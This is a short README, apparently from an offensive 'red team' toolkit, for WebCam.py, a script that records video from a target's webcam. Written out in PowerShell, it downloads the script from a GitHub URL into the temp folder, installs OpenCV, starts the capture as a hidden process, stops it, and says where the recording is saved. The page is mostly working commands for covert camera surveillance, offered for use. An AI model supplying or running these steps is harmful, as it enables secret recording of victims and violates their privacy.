## WebCam.py - Under Develop (Not stable)

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|WebCam|Capture video using target webcam|User Land|Credits: @AHLASaad \ @AvinabSaha<br />[Article](https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python)|

<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$Env:TMP\WebCam.py"
```

<br />

**prerequesites checks:**
```powershell
#Check if Pthon3 its installed

#Check if opencv its installed
[bool](pip3 list|findstr /C:"opencv-python")

#Install opencv and numpy modules
pip3 install opencv-python
```

<br />

**execute:**
```powershell
#Edit WebCam.py and change next cmdline to point to our 'python\site-packages' directory
sys.path.append("c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages")

#Start capture
Start-Process -WindowStyle hidden python3 -argumentlist "$Env:TMP\WebCam.py"

#Stop capture
stop-process -name python3.9
```

<br />

**Final Notes:**
```powershell
Video recording its stored on WebCam.py current directory under the name: "outpy.avi"
```
